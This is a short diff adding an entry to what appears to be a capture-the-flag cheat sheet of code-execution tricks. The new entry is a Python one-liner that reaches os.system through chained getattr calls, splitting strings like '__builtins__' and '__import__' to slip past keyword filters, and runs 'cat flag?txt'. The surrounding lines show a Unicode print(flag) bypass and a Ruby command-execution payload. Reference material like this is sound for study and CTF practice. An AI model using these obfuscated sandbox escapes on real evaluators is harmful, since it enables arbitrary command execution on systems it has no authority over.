@@ -63,6 +63,10 @@
   𝘱𝘳𝘪𝘯𝘵(𝘧𝘭𝘢𝘨)
   ```
 
+  ```py
+  getattr(getattr(getattr(globals(), 'get')('__bu' + 'iltins__'), '__imp' + 'ort__')('o' + 's'), 'sys' + 'tem')('cat flag?txt')
+  ```
+
 ## Ruby Command Executing
 
 - `open("| ls")`
